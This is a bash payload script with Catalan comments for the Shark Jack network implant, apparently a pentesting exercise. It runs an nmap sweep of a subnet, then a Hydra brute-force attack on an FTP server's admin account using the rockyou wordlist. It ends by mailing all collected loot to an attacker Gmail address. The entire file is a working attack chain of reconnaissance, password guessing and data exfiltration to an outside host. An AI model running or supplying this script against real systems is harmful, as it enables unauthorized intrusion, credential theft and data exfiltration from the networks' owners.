#!/bin/bash
#
# Títol:         Payload de Pentesting
# Autor:         Alejandro, Frank & Fouad
# Versió:        1.0
#
# Descripció:    Aquest payload realitza una sèrie d'atacs de pentesting
#                utilitzant el Shark Jack per recopilar informació,
#                realitzar atacs de xarxa i exfiltrar dades.
#
# LED SETUP (Magenta): Configuració inicial
# LED ATTACK (Groc intermitent): Realització d'atacs
# LED FAIL (Vermell intermitent): Fallada en l'execució del payload
# LED SPECIAL (Cian intermitent): Exfiltració de dades
# LED FINISH (Verd intermitent ràpid a sòlid): Finalització exitosa
#

# Funció per gestionar falles
function fail() {
    LED FAIL
    echo "[ERROR] $1"
    exit 1
}

# Funció per configurar l'entorn
function setup() {
    LED SETUP

    # Crear directori de botí
    LOOT_DIR="/root/loot/pentesting"
    mkdir -p $LOOT_DIR || fail "No s'ha pogut crear el directori de botí"

    # Configurar interfície de xarxa
    NETMODE TRANSPARENT || fail "No s'ha pogut configurar el mode de xarxa"
}

# Funció per realitzar l'escaneig de xarxa
function network_scan() {
    LED ATTACK

    # Escaneig de xarxa amb nmap
    nmap -sn 10.1.82.0/24 -oN $LOOT_DIR/network_scan.txt || fail "Escaneig de xarxa fallit"
}

# Funció per realitzar un atac de força bruta
function brute_force_attack() {
    LED ATTACK

    # Atac de força bruta amb Hydra
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.1.82.133 || fail "Atac de força bruta fallit"
}

# Funció per exfiltrar dades
function exfiltrate_data() {
    LED SPECIAL

    # Exfiltració de dades a través de correu electrònic
    cat $LOOT_DIR/* | mail -s "Dades exfiltrades" attacker@gmail.com || fail "Exfiltració de dades fallida"
}

# Funció per finalitzar el payload
function finish() {
    LED FINISH
    echo "Payload executat amb èxit"
}

# Executar el payload
setup
network_scan
brute_force_attack
exfiltrate_data
finish
